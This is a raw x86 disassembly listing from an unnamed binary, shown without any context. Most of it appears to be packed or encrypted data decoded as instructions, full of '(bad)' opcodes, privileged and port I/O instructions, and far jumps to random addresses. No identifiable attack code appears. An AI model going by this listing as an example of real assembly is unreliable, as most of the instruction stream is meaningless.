  419f77:	pop    ebp
  419f78:	jne    0x419ff0
  419f7a:	mov    bl,BYTE PTR [ebp+ebx*8-0x77]
  419f7e:	jbe    0x419f03
  419f80:	adc    BYTE PTR [ecx],ch
  419f82:	enter  0x42a9,0xf4
  419f86:	outs   dx,DWORD PTR ds:[esi]
  419f87:	clc    
  419f88:	pop    edi
  419f89:	xor    ebx,DWORD PTR [ebx+0x68bf4472]
  419f8f:	clts   
  419f91:	je     0x419f36
  419f93:	repnz push 0x34
  419f96:	cs pop edx
  419f98:	and    eax,0x3bc5f8c5
  419f9d:	mov    ebp,0x4c39b498
  419fa2:	neg    al
  419fa4:	inc    DWORD PTR [ecx]
  419fa6:	inc    eax
  419fa7:	jl     0x41a00a
  419fa9:	pop    eax
  419faa:	xchg   edi,eax
  419fab:	xchg   BYTE PTR [edx-0x5334fa29],bh
  419fb1:	pop    ss
  419fb2:	or     BYTE PTR [ebx-0x59fe9c75],al
  419fb8:	in     al,dx
  419fb9:	ins    DWORD PTR es:[edi],dx
  419fba:	pusha  
  419fbb:	shl    DWORD PTR [edi],1
  419fbd:	pop    esp
  419fbe:	or     ebp,DWORD PTR [edx-0x7e]
  419fc1:	aas    
  419fc2:	and    cl,BYTE PTR [esi]
  419fc4:	ins    DWORD PTR es:[edi],dx
  419fc5:	sub    bh,al
  419fc7:	aaa    
  419fc8:	repz mov ds:0x91a2bb7e,al
  419fce:	inc    edx
  419fcf:	or     esp,DWORD PTR [esi-0x69]
  419fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fd3:	lea    ebp,[eax-0x604d7571]
  419fd9:	jg     0x419fa1
  419fdb:	bound  ebx,QWORD PTR [ecx-0x4c]
  419fde:	aaa    
  419fdf:	or     dl,cl
  419fe1:	add    BYTE PTR [ebx+0x2d2bb7ca],bl
  419fe7:	(bad)  
  419fe9:	sub    DWORD PTR [ebx-0x14],edi
  419fec:	clc    
  419fed:	fnclex 
  419fef:	dec    ebx
  419ff0:	mov    cl,0xaa
  419ff2:	sub    eax,0x6f451499
  419ff7:	outs   dx,DWORD PTR ds:[esi]
  419ff8:	into   
  419ff9:	mov    fs,edi
  419ffb:	retf   
  419ffc:	adc    DWORD PTR [ebx+0xc2b9adc],esi
  41a002:	stc    
  41a003:	dec    eax
  41a004:	jmp    0x6710:0x99ea14af
  41a00b:	add    dl,BYTE PTR [ebp+0x24]
  41a00e:	or     esp,DWORD PTR [edi-0x45178db4]
  41a014:	les    ebp,FWORD PTR [ecx]
  41a016:	push   es
  41a017:	and    BYTE PTR [edi-0x25cd7e97],ah
  41a01d:	shl    BYTE PTR [edi+0x2d],0x87
  41a021:	pop    es
  41a022:	xchg   esi,eax
  41a023:	dec    ecx
  41a024:	pop    es
  41a025:	icebp  
  41a026:	jp     0x41a049
  41a028:	inc    ecx
  41a029:	sbb    DWORD PTR [eax],0xc7ed6033
  41a02f:	scas   al,BYTE PTR es:[edi]
  41a030:	je     0x41a03d
  41a032:	pop    ecx
  41a033:	add    ebp,DWORD PTR [eax-0x370386cc]
  41a039:	jmp    ebx
  41a03b:	fistp  QWORD PTR [eax+ebp*2]
  41a03e:	jmp    0x9cc8b6b9
  41a043:	icebp  
  41a044:	std    
  41a045:	dec    edx
  41a046:	stos   BYTE PTR es:[edi],al
  41a047:	call   0xac17:0xd8bd282c
  41a04e:	out    dx,al
  41a04f:	test   DWORD PTR [ecx+eax*8-0x21],esi
  41a053:	in     al,dx
  41a054:	sub    DWORD PTR [edi-0x55],esi
  41a057:	dec    edx
  41a058:	jle    0x41a003
  41a05a:	mov    al,ds:0xc92dba2c
  41a05f:	hlt    
  41a060:	inc    ecx
  41a061:	cmp    ecx,DWORD PTR [edi+0x4390af11]
  41a067:	lods   eax,DWORD PTR ds:[esi]
  41a068:	push   ds
  41a069:	adc    BYTE PTR [ebx+0x11],ch
  41a06c:	pop    ecx
  41a06d:	or     al,al
  41a06f:	mov    ebp,0x984da329
  41a074:	and    eax,0xce28da50
  41a079:	out    dx,eax
  41a07a:	xchg   ebx,eax
  41a07b:	das    
  41a07c:	add    al,0x1b
  41a07e:	jmp    0x41a0bd
  41a080:	jb     0x41a0e5
  41a082:	mov    bh,0x83
  41a084:	nop
  41a085:	push   esp
  41a086:	mov    ds:0x3fd8da7a,al
  41a08b:	rol    DWORD PTR [esi-0x80],cl
  41a08e:	add    eax,DWORD PTR [ebx+0x223f83a5]
  41a094:	loop   0x41a01f
  41a096:	aad    0x98
  41a098:	xor    eax,0x5b9ae59c
  41a09d:	(bad)  [ecx-0x2b]
  41a0a0:	shl    DWORD PTR [ebp-0x6],1
  41a0a3:	cmp    eax,0x109ac2fe
  41a0a8:	nop
  41a0a9:	xor    dl,dl
  41a0ab:	pminub mm5,QWORD PTR [esi]
  41a0ae:	pop    ds
  41a0af:	cmp    BYTE PTR [edx],ch
  41a0b1:	clc    
  41a0b2:	and    DWORD PTR ds:0xd4463024,0xfffffff4
  41a0b9:	stos   BYTE PTR es:[edi],al
  41a0ba:	xor    al,0xcf
  41a0bc:	jp     0x41a044
  41a0be:	mov    edx,0x6072e779
  41a0c3:	fwait
  41a0c4:	daa    
  41a0c5:	dec    eax
  41a0c6:	iret   
  41a0c7:	out    dx,al
  41a0c8:	(bad)  
  41a0c9:	fimul  DWORD PTR [eax]
  41a0cb:	mov    ecx,0x7aa0c748
  41a0d0:	test   eax,0x77ff05ab
  41a0d5:	ret    
  41a0d6:	repz jp 0x41a154
  41a0d9:	fld    QWORD PTR [edx+0x7a23ffc6]
  41a0df:	jmp    0x8857:0xb45d9f76
  41a0e6:	loope  0x41a0ea
  41a0e8:	jns    0x41a0bd
  41a0ea:	(bad)  [edi]
  41a0ec:	pop    ds
  41a0ed:	xor    eax,0x700a14e9
  41a0f2:	and    al,0x50
  41a0f4:	mov    al,0x30
  41a0f6:	jecxz  0x41a170
  41a0f8:	mov    bh,0x76
  41a0fa:	mov    cr7,ebp
  41a0fd:	loop   0x41a096
  41a0ff:	(bad)  
  41a100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a101:	mov    esi,DWORD PTR [esp+ecx*2]
  41a104:	push   esp
  41a105:	xor    al,0xb
  41a107:	es xor al,0x3
  41a10a:	fimul  WORD PTR ds:0xf970d8ef
  41a110:	(bad)  
  41a112:	adc    esi,edi
  41a114:	call   0x17502740
  41a119:	int    0x92
  41a11b:	lds    eax,FWORD PTR [ebx]
  41a11d:	and    DWORD PTR [ecx-0xe263945],eax
  41a123:	sub    al,0xcb
  41a125:	scas   al,BYTE PTR es:[edi]
  41a126:	sub    ch,BYTE PTR [ebx+0x23]
  41a129:	adc    DWORD PTR [ebp+0x1bb612aa],ebp
  41a12f:	mov    dh,0xd1
  41a131:	ds loop 0x41a151
  41a134:	pop    ebp
  41a135:	fcomp  st(3)
  41a137:	aam    0xae
  41a139:	hlt    
  41a13a:	push   ds
  41a13b:	loope  0x41a196
  41a13d:	pop    ebp
  41a13e:	(bad)  
  41a140:	arpl   WORD PTR [ebx],bp
  41a142:	mov    dh,BYTE PTR [edx+0x20f8abcd]
  41a148:	mov    ds:0x68af985,eax
  41a14d:	dec    ebx
  41a14e:	popf   
  41a14f:	shl    DWORD PTR [esi+0x9],cl
  41a152:	es cli 
  41a154:	daa    
  41a155:	mov    bh,0x43
  41a157:	mov    dl,0xa5
  41a159:	xchg   DWORD PTR [ebx+0x5b2e7982],esi
  41a15f:	icebp  
  41a160:	sbb    BYTE PTR [ecx+0x38],dh
  41a163:	mov    al,0xb6
  41a165:	pushf  
  41a166:	push   es
  41a167:	popf   
  41a168:	pop    eax
  41a169:	jl     0x41a1af
  41a16b:	sahf   
  41a16c:	pcmpgtb mm6,QWORD PTR [ebx-0x7f34db73]
  41a173:	dec    eax
  41a174:	ja     0x41a1ef
  41a176:	loop   0x41a193
  41a178:	int3   
  41a179:	or     al,0xe2
  41a17b:	mov    edi,0xcff1f262
  41a180:	dec    esp
  41a181:	push   ds
  41a182:	jbe    0x41a106
  41a184:	mov    edi,db3
  41a187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a188:	push   ds
  41a189:	ins    DWORD PTR es:[edi],dx
  41a18a:	cli    
  41a18b:	pop    esi
  41a18c:	cli    
  41a18d:	inc    edx
  41a18e:	fsub   DWORD PTR [edx+0x5e42672f]
  41a194:	mov    es:0x9fc2efea,eax
  41a19a:	sbb    dl,ah
  41a19c:	xchg   DWORD PTR [ebx+ebx*4],ecx
  41a19f:	dec    esp
  41a1a0:	dec    eax
  41a1a1:	sub    al,0xf4
  41a1a3:	jle    0x41a1aa
  41a1a5:	bound  ebx,QWORD PTR [edx]
  41a1a7:	into   
  41a1a8:	mov    ds:0xb1cecf,eax
  41a1ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1ae:	pop    eax
  41a1af:	adc    eax,0xa91102c
  41a1b4:	ret    0x5005
  41a1b7:	mov    ds:0xc5532ead,al
  41a1bc:	es in  al,0xa5
  41a1bf:	xor    eax,0x10d8a82e
  41a1c4:	mov    dl,0x96
  41a1c6:	push   0xa435e3ec
  41a1cb:	pop    esp
  41a1cc:	out    dx,al
  41a1cd:	mov    ebp,0x6f075187
  41a1d2:	test   edi,ecx
  41a1d4:	out    0xb3,al
  41a1d6:	nop
  41a1d7:	in     eax,0x39
  41a1d9:	ret    
  41a1da:	cmp    edx,ecx
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	fsubrp st(0),st
  41a209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a20a:	sbb    eax,0x7a7d1c6e
  41a20f:	or     bl,BYTE PTR [edi+0x7a]
  41a212:	jp     0x41a1a8
  41a214:	bsf    esp,DWORD PTR [ebp-0x2c]
  41a218:	mov    bh,0x14
  41a21a:	int3   
  41a21b:	xchg   ebx,eax
  41a21c:	add    esp,DWORD PTR ds:0x5a02851e
  41a222:	cmp    DWORD PTR [edx+edx*4-0x553643c2],0xec826c5d
  41a22d:	pop    edx
  41a22e:	dec    ebp
  41a22f:	sar    DWORD PTR [edx+0x46],1
  41a232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a233:	(bad)  [ecx-0x5c1abb14]
  41a239:	imul   edx,DWORD PTR ds:0xb668fd0c,0x202b47e9
  41a243:	xor    esp,DWORD PTR [ecx]
  41a245:	lock push edi
  41a247:	mov    al,0xb0
  41a249:	sar    BYTE PTR [ebp+0xa40c9d5],cl
  41a24f:	mov    ecx,0xc19fe280
  41a254:	scas   eax,DWORD PTR es:[edi]
  41a255:	test   ah,bh
  41a257:	mov    DWORD PTR [ebx+0x2c],0xb7506ff2
  41a25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a25f:	add    DWORD PTR [ecx+0x20],esi
  41a262:	jae    0x41a246
  41a264:	fcom   DWORD PTR [ebp+0x6c5f8b63]
  41a26a:	cmp    DWORD PTR [eax],eax
  41a26c:	push   0x6fb35baf
  41a271:	adc    DWORD PTR [edi],0x0
  41a274:	xor    DWORD PTR cs:[bx+si+0xd],0xa3facefa
  41a27d:	in     eax,dx
  41a27e:	sbb    DWORD PTR [esi-0x5640bc8f],edi
  41a284:	push   esi
  41a285:	aas    
  41a286:	ss ins DWORD PTR es:[edi],dx
  41a288:	(bad)  
  41a289:	mov    ebp,0x3f049539
  41a28e:	xor    ebp,DWORD PTR [esi+0x1b]
  41a291:	push   ss
  41a292:	(bad)  
  41a293:	retf   
  41a294:	cmc    
  41a295:	mov    ebp,0x445da2a3
  41a29a:	push   esp
  41a29b:	dec    edi
  41a29c:	inc    edi
  41a29d:	push   edx
  41a29e:	enter  0x62af,0x2b
  41a2a2:	or     ch,BYTE PTR ds:0x21749d7a
  41a2a8:	or     dh,BYTE PTR [edi+0x4c91aa6c]
  41a2ae:	cmp    esi,DWORD PTR [edx+esi*2]
  41a2b1:	das    
  41a2b2:	(bad)
  41a2b5:	jg     0x41a2d5
  41a2b7:	scas   eax,DWORD PTR es:[edi]
  41a2b8:	push   edx
  41a2b9:	add    BYTE PTR [edx+0x66],dh
  41a2bc:	std    
  41a2bd:	push   eax
  41a2be:	(bad)  
  41a2bf:	repnz xor ebx,eax
  41a2c2:	jp     0x41a2e3
  41a2c4:	rcr    DWORD PTR ds:0xc554fed6,cl
  41a2ca:	pop    edx
  41a2cb:	loope  0x41a2ee
  41a2cd:	pop    esi
  41a2ce:	push   es
  41a2cf:	ret    0xf796
  41a2d2:	retf   
  41a2d3:	dec    ebx
  41a2d4:	mov    esi,0x728c62c1
  41a2d9:	mov    dl,0x7
  41a2db:	imul   DWORD PTR [ebx]
  41a2dd:	or     eax,0x2819b3bc
  41a2e2:	sti    
  41a2e3:	not    edx
  41a2e5:	loop   0x41a289
  41a2e7:	jl     0x41a35e
  41a2e9:	inc    esp
  41a2ea:	or     ebp,ebp
  41a2ec:	push   ebx
  41a2ed:	push   es
  41a2ee:	fidiv  DWORD PTR [edx+0x24a9a3ae]
  41a2f4:	ret    
  41a2f5:	shl    BYTE PTR [eax+0x16],1
  41a2f8:	stos   DWORD PTR es:[edi],eax
  41a2f9:	xchg   DWORD PTR [eax],edi
  41a2fb:	lea    edi,[ebp-0x4d]
  41a2fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ff:	std    
  41a300:	(bad)  
  41a301:	std    
  41a302:	xchg   edx,eax
  41a303:	and    eax,0x12df6c56
  41a308:	dec    ebx
  41a309:	push   esp
  41a30a:	outs   dx,BYTE PTR ds:[esi]
  41a30b:	neg    cl
  41a30d:	ins    BYTE PTR es:[edi],dx
  41a30e:	imul   esi,DWORD PTR [ebp+0x13]
  41a312:	es jmp 0x37abbe00
  41a318:	call   0xdf28:0xcb68405d
  41a31f:	test   eax,0x1bb291cf
  41a324:	pop    ebx
  41a325:	std    
  41a326:	(bad)  
  41a327:	cs pop edi
  41a329:	jle    0x41a33d
  41a32b:	and    ecx,DWORD PTR [eax]
  41a32d:	ret    0x458b
  41a330:	scas   al,BYTE PTR es:[edi]
  41a331:	sbb    DWORD PTR [esi],esi
  41a333:	hlt    
  41a334:	add    eax,0x1392e331
  41a339:	ror    al,cl
  41a33b:	jecxz  0x41a373
  41a33d:	imul   esi,DWORD PTR [ecx+0x6a0712f9],0x142010e3
  41a347:	push   eax
  41a348:	scas   al,BYTE PTR es:[edi]
  41a349:	mov    esi,0x3a3d968a
  41a34e:	stc    
  41a34f:	sub    al,0x45
  41a351:	sub    eax,0x98ffd10a
  41a356:	or     ah,BYTE PTR ds:0x80b46b78
  41a35c:	outs   dx,DWORD PTR ds:[esi]
  41a35d:	or     al,0x46
  41a35f:	je     0x41a357
  41a361:	mov    esp,0xb4cfbf19
  41a366:	inc    ebx
  41a367:	bound  ecx,QWORD PTR [eax]
  41a369:	pop    ds
  41a36a:	dec    esp
  41a36b:	out    0x64,eax
  41a36d:	push   edi
  41a36e:	sahf   
  41a36f:	adc    eax,DWORD PTR [esi+ebp*1-0x24]
  41a373:	jmp    0x41a36e
  41a375:	sub    DWORD PTR [edi+0x3bab8441],eax
  41a37b:	dec    ecx
  41a37c:	imul   ebx,DWORD PTR [eax+0x5d6ce9cc],0x330d24ec
  41a386:	gs sahf 
  41a388:	xchg   edx,eax
  41a389:	sub    bh,bh
  41a38b:	bound  ebx,QWORD PTR [edx+0x72]
  41a38e:	add    ebp,DWORD PTR [edx-0x47]
  41a391:	xor    esp,DWORD PTR [esp+esi*1-0x16]
  41a395:	pop    edx
  41a396:	aad    0x37
  41a398:	sbb    BYTE PTR [eax+0x29d819],0xd5
  41a39f:	cmp    dl,BYTE PTR [ebx+0x16]
  41a3a2:	jo     0x41a386
  41a3a4:	nop
  41a3a5:	mov    cl,0x40
  41a3a7:	cwde   
  41a3a8:	pop    ebp
  41a3a9:	and    BYTE PTR [edi+0x7c0f8070],0xfe
  41a3b0:	js     0x41a3ed
  41a3b2:	jmp    0x41a351
  41a3b4:	pushf  
  41a3b5:	or     ebp,DWORD PTR [esi+edi*1]
  41a3b8:	jo     0x41a40f
  41a3ba:	inc    ebx
  41a3bb:	inc    eax
  41a3bc:	push   esi
  41a3bd:	add    eax,0x5857f215
  41a3c2:	aaa    
  41a3c3:	std    
  41a3c4:	scas   al,BYTE PTR es:[edi]
  41a3c5:	dec    ebp
  41a3c6:	das    
  41a3c7:	ret    0x69fe
  41a3ca:	loopne 0x41a380
  41a3cc:	mov    ss,esp
  41a3ce:	sub    cl,ch
  41a3d0:	mov    bl,bh
  41a3d2:	pop    edx
  41a3d3:	sti    
  41a3d4:	xor    BYTE PTR [edx+0x4004e20],dh
  41a3da:	sub    ebp,edx
  41a3dc:	mov    al,BYTE PTR ds:0xab5ac23e
  41a3e2:	call   0x890f0e9
  41a3e7:	ficomp WORD PTR [edi-0xcf07e]
  41a3ed:	aad    0x87
  41a3ef:	outs   dx,BYTE PTR ds:[esi]
  41a3f0:	pop    ss
  41a3f1:	mov    esi,DWORD PTR [eax+edi*2]
  41a3f4:	push   ebp
  41a3f5:	call   0x13c6:0x24eaa2be
  41a3fc:	ss pusha 
  41a3fe:	iret   
  41a3ff:	int    0xb
  41a401:	lds    edi,FWORD PTR [esi-0x4f]
  41a404:	mov    cl,0xd4
  41a406:	push   ss
  41a407:	rcr    DWORD PTR [ebx-0x5525d157],1
  41a40d:	cmp    dh,bl
  41a40f:	in     al,0x1f
  41a411:	(bad)  
  41a412:	adc    al,0xb7
  41a414:	cs ror dl,cl
  41a417:	adc    BYTE PTR ds:0x68f3976b,ah
  41a41d:	ret    
  41a41e:	fwait
  41a41f:	lea    ebx,ds:0xe4e7c8b3
  41a425:	call   0x756698de
  41a42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a42b:	jbe    0x41a481
  41a42d:	nop
  41a42e:	not    edi
  41a430:	mov    ebp,0xe384e4ee
  41a435:	shr    BYTE PTR [eax],0x56
  41a438:	jle    0x41a433
  41a43a:	xor    esp,0xffffff9c
  41a43d:	adc    DWORD PTR [eax+0x7701e0d0],esp
  41a443:	sbb    BYTE PTR [eax-0x17],ah
  41a446:	cmp    cl,BYTE PTR [esi+0x18854dcf]
  41a44c:	mov    esi,DWORD PTR [ecx]
  41a44e:	dec    esi
  41a44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a450:	xor    BYTE PTR [edx+eiz*1-0x51],bl
  41a454:	push   ebx
  41a455:	add    ch,BYTE PTR [esp+ecx*8]
  41a458:	call   0x5bb1:0x39c0a2c0
  41a45f:	cs lahf 
  41a461:	ficomp WORD PTR [ebx+0x21]
  41a464:	mov    esi,0xd269cf3e
  41a469:	(bad)  
  41a46b:	in     eax,dx
  41a46c:	sub    al,0xdf
  41a46e:	jne    0x41a418
  41a470:	push   0xe886d0cb
  41a475:	lea    ebx,[esi-0x5ad9d696]
  41a47b:	jl     0x41a459
  41a47d:	mul    DWORD PTR [ebx-0x37]
  41a480:	xchg   esi,eax
  41a481:	aad    0x35
  41a483:	js     0x41a4e6
  41a485:	add    DWORD PTR [ecx],ecx
  41a487:	mov    cl,0xc6
  41a489:	adc    eax,0xed21b769
  41a48e:	mov    dl,0x16
  41a490:	push   cs
  41a491:	mov    bh,0xcd
  41a493:	cwde   
  41a494:	jle    0x41a494
  41a496:	mov    bh,ch
  41a498:	sub    al,0x49
  41a49a:	pusha  
  41a49b:	pop    edi
  41a49c:	jmp    0x6d901861
  41a4a1:	fsubr  DWORD PTR [edi+edi*8-0xe715637]
  41a4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4a9:	mov    ah,0xfe
  41a4ab:	or     DWORD PTR [edx+0x57],ebp
  41a4ae:	push   ecx
  41a4af:	out    dx,al
  41a4b0:	repz inc ecx
  41a4b2:	out    dx,eax
  41a4b3:	mov    esp,0xb1259ad3
  41a4b8:	mov    edi,0x1cc32b0a
  41a4bd:	enter  0xfd22,0x5b
  41a4c1:	not    BYTE PTR [ebx+0xf]
  41a4c4:	add    ebx,ebx
  41a4c6:	les    esp,FWORD PTR [esi+0x25]
  41a4c9:	mov    DWORD PTR [ecx-0x3bdba684],esi
  41a4cf:	dec    esi
  41a4d0:	out    dx,eax
  41a4d1:	jle    0x41a50f
  41a4d3:	xchg   edx,eax
  41a4d4:	ja     0x41a4e6
  41a4d6:	ret    0xdb6
  41a4d9:	jns    0x41a4bd
  41a4db:	fisub  WORD PTR [ecx]
  41a4dd:	xor    DWORD PTR [edi+ebx*1+0x3a],ebx
  41a4e1:	fiadd  WORD PTR [edx]
  41a4e3:	inc    edx
  41a4e4:	add    bh,BYTE PTR ds:0xfb5e779a
  41a4ea:	fs and al,0xe8
  41a4ed:	ds inc edx
  41a4ef:	or     eax,0xa8293e74
  41a4f4:	loope  0x41a573
  41a4f6:	and    dh,bh
  41a4f8:	into   
  41a4f9:	hlt    
  41a4fa:	lds    ebx,FWORD PTR [eax+0x3b]
  41a4fd:	fnstcw WORD PTR [esi+0x18fa15da]
  41a503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a504:	and    ebp,ebx
  41a506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a507:	lods   eax,DWORD PTR ds:[esi]
  41a508:	bound  edi,QWORD PTR [edx-0x57e78bc4]
  41a50e:	mov    al,ds:0x4bbf8b
  41a513:	shl    DWORD PTR [ebx-0x3858c7ef],0x7e
  41a51a:	fimul  WORD PTR [ebx+ecx*8+0x4624d940]
  41a521:	xor    edi,edi
  41a523:	and    bl,BYTE PTR [ebx+0x7]
  41a526:	push   ds
  41a527:	sub    BYTE PTR [ebp+0x5d1705d],al
  41a52d:	rcl    DWORD PTR gs:[esi+edx*1],1
  41a531:	pop    ebx
  41a532:	shr    edi,0xaf
  41a535:	jo     0x41a4c7
  41a537:	iret   
  41a538:	je     0x41a522
  41a53a:	xor    eax,0xd2509394
  41a53f:	pusha  
  41a540:	(bad)  
  41a541:	or     eax,0x4c441ed8
  41a546:	fxch   st(0)
  41a548:	add    ch,BYTE PTR [ecx+0x38cfb79e]
  41a54e:	shr    ebx,0xfc
  41a551:	aaa    
  41a552:	pop    eax
  41a553:	mov    ecx,cs
  41a555:	push   ebp
  41a556:	pop    edx
  41a557:	mov    edi,0xb1b46bb4
  41a55c:	in     al,dx
  41a55d:	cmp    eax,0x5a1a462b
  41a562:	jbe    0x41a559
  41a564:	inc    esp
  41a565:	data16 xlat BYTE PTR ds:[ebx]
  41a567:	not    ecx
  41a569:	push   edx
  41a56a:	sub    DWORD PTR [ecx-0x43],ebp
  41a56d:	jnp    0x41a504
  41a56f:	in     al,0x45
  41a571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a572:	scas   eax,DWORD PTR es:[edi]
  41a573:	mov    bl,0x2e
  41a575:	and    eax,0xbec49797
  41a57a:	push   edi
  41a57b:	sbb    BYTE PTR [edi+0x5d],cl
  41a57e:	xchg   edx,eax
  41a57f:	xchg   ecx,eax
  41a580:	and    al,0x69
  41a582:	sub    ebp,ebx
  41a584:	shl    BYTE PTR [eax],0x8
  41a587:	popf   
  41a588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a589:	retf   0x9fb0
  41a58c:	jle    0x41a555
  41a58e:	(bad)  
  41a58f:	fdiv   st(0),st
  41a591:	cs dec esi
  41a593:	nop
  41a594:	inc    esi
  41a595:	into   
  41a596:	push   esi
  41a597:	imul   ebx,DWORD PTR ds:0xdb04fc5e,0xed2de83c
  41a5a1:	cmp    al,0xff
  41a5a3:	mov    edx,0x600c4dda
  41a5a8:	data16 sbb ah,BYTE PTR ds:0xe8604e44
  41a5af:	xlat   BYTE PTR ds:[ebx]
  41a5b0:	mov    edx,0xca58e87d
  41a5b5:	xchg   esi,eax
  41a5b6:	or     DWORD PTR [esi-0x1b322a0f],ecx
  41a5bc:	iret   
  41a5bd:	fisttp WORD PTR [ebp-0x5c]
  41a5c0:	and    al,0xe1
  41a5c2:	jnp    0x41a547
  41a5c4:	pop    ecx
  41a5c5:	mov    bl,0xd2
  41a5c7:	sbb    al,0x16
  41a5c9:	mov    ah,0xa0
  41a5cb:	xor    al,0x3f
  41a5cd:	std    
  41a5ce:	mov    esi,0xd9e8230b
  41a5d3:	mov    WORD PTR [edx+0x1dcfe981],cs
  41a5d9:	pop    edx
  41a5da:	sbb    ecx,ecx
  41a5dc:	adc    eax,0xf4d5401c
  41a5e1:	mov    bl,0x7
  41a5e3:	mov    WORD PTR [ebx+esi*4-0x150bbcc3],cs
  41a5ea:	push   ebp
  41a5eb:	ret    
  41a5ec:	test   ecx,ebp
  41a5ee:	push   ebp
  41a5ef:	inc    ebp
  41a5f0:	or     BYTE PTR [edx],0x21
  41a5f3:	mov    bl,0xff
  41a5f5:	sub    ch,BYTE PTR [ecx+ebp*1+0x46ebd015]
  41a5fc:	and    al,0x6a
  41a5fe:	cmp    al,0xb9
  41a600:	push   esp
  41a601:	sub    bh,BYTE PTR [edx-0x1e]
  41a604:	inc    esp
  41a605:	jmp    0x7ac92441
  41a60a:	dec    esp
  41a60b:	xchg   ecx,eax
  41a60c:	push   esp
  41a60d:	cmp    DWORD PTR [eax+0x1253223a],ebp
  41a613:	sub    bl,bl
  41a615:	dec    ebp
  41a616:	retf   
  41a617:	adc    ecx,DWORD PTR [eax+ebx*2]
  41a61a:	and    eax,0x9ee009da
  41a61f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a620:	icebp  
  41a621:	add    edi,ebx
  41a623:	jp     0x41a647
  41a625:	es (bad) 
  41a627:	(bad)  
  41a628:	sub    bh,bl
  41a62a:	daa    
  41a62b:	mov    bl,0xdc
  41a62d:	daa    
  41a62e:	(bad)  
  41a62f:	sub    ch,BYTE PTR [ecx-0x61]
  41a632:	mov    ebx,0x8039113
  41a637:	xchg   ebp,eax
  41a638:	nop
  41a639:	(bad)  
  41a63a:	fnstsw WORD PTR [edi]
  41a63c:	push   0xffffffeb
  41a63e:	mov    ebp,0x8977a5a9
  41a643:	inc    esi
  41a644:	mov    al,0xe3
  41a646:	pop    esp
  41a647:	in     al,0xb3
  41a649:	pop    ds
  41a64a:	leave  
  41a64b:	mov    gs,WORD PTR [eax-0x2f]
  41a64e:	inc    eax
  41a64f:	out    dx,al
  41a650:	ins    DWORD PTR es:[edi],dx
  41a651:	sti    
  41a652:	mov    ecx,0xba18935b
  41a657:	aaa    
  41a658:	addr16 push ebp
  41a65a:	push   ebp
  41a65b:	call   0xb26572ab
  41a660:	cli    
  41a661:	sbb    DWORD PTR [eax],ecx
  41a663:	repz popf 
  41a665:	bound  esi,QWORD PTR [eax+eax*1-0x38]
  41a669:	dec    ebp
  41a66a:	and    ebx,DWORD PTR [edx]
  41a66c:	add    al,0x59
  41a66e:	(bad)  
  41a670:	adc    esp,edi
  41a672:	mov    al,ds:0xd9b96162
  41a677:	mov    ebx,0x95482c52
  41a67c:	adc    DWORD PTR [ebp+0x78],ecx
  41a67f:	xor    cl,BYTE PTR [esi-0x19]
  41a682:	xchg   edi,eax
  41a683:	popa   
  41a684:	iret   
  41a685:	lods   eax,DWORD PTR ds:[esi]
  41a686:	mov    ebp,0x800cd537
  41a68b:	stc    
  41a68c:	mov    esp,0xef635366
  41a691:	dec    edx
  41a692:	into   
  41a693:	inc    ecx
  41a694:	adc    eax,0xbc78d8fe
  41a699:	mov    ch,bl
  41a69b:	sahf   
  41a69c:	jno    0x41a6eb
  41a69e:	jecxz  0x41a6c3
  41a6a0:	mov    eax,ds:0x7aa575d4
  41a6a5:	or     DWORD PTR [ebx+0x5bae3c9c],ecx
  41a6ab:	pop    ss
  41a6ac:	xchg   esi,eax
  41a6ad:	je     0x41a726
  41a6af:	jp     0x41a69d
  41a6b1:	jno    0x41a67c
  41a6b3:	and    al,0x8c
  41a6b5:	std    
  41a6b6:	adc    eax,0x835a055e
  41a6bb:	cmp    bh,BYTE PTR [esi+0x4d]
  41a6be:	enter  0x7e62,0xf
  41a6c2:	pop    edi
  41a6c3:	neg    ch
  41a6c5:	xchg   esp,eax
  41a6c6:	bound  ebx,QWORD PTR [edi]
  41a6c8:	xor    ch,bl
  41a6ca:	shr    ch,0x99
  41a6cd:	fwait
  41a6ce:	outs   dx,DWORD PTR ds:[esi]
  41a6cf:	bound  esi,QWORD PTR [edi]
  41a6d1:	dec    eax
  41a6d2:	rol    BYTE PTR [edx-0x1c],cl
  41a6d5:	data16 jp 0x41a673
  41a6d8:	fidiv  DWORD PTR [edi-0x7f]
  41a6db:	cli    
  41a6dc:	mov    eax,0x59fe7e3e
  41a6e1:	xchg   BYTE PTR [eax-0x6457b68e],dh
  41a6e7:	mov    ebp,0xd595e3af
  41a6ec:	xchg   esp,eax
  41a6ed:	in     eax,0x5b
  41a6ef:	push   ebp
  41a6f0:	xchg   esi,eax
  41a6f1:	or     DWORD PTR [edi+0x45],esp
  41a6f4:	cs and eax,0xf6b2e188
  41a6fa:	loop   0x41a738
  41a6fc:	jno    0x41a6b3
  41a6fe:	ja     0x41a714
  41a700:	xchg   ebx,eax
  41a701:	push   0x52
  41a703:	leave  
